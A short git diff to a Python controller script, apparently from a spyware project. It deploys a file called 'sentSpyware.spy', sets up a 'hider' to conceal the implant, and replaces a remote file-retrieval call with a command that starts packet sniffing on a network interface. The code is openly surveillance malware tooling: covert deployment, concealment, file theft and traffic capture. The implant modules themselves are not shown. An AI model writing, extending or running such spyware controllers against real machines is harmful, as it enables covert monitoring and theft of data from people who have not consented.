@@ -4,6 +4,8 @@ from command import Command
 from responce import Responce
 from funCode import FunCode
 from time import sleep
+from contParams import *
+from structParams import *
 
 # HOST = "192.168.83.130"
 HOST = "localhost"
@@ -29,10 +31,12 @@ def main():
             "sentSpyware.spy",
         )
     )
-    sleep(2)
+    sleep(1)
     spyAgent = Agent(HOST, PORT_SPYWARE)
     print(spyAgent.hider_setup(targetHiderPath))
-    print(spyAgent.retrieve_file("fishfish.txt"))
+
+    params = ContParams(SnifferType, Params(SniffParams(5, b"ens33")))
+    print(spyAgent.runContraption(params, 4))
 
 
 if __name__ == "__main__":
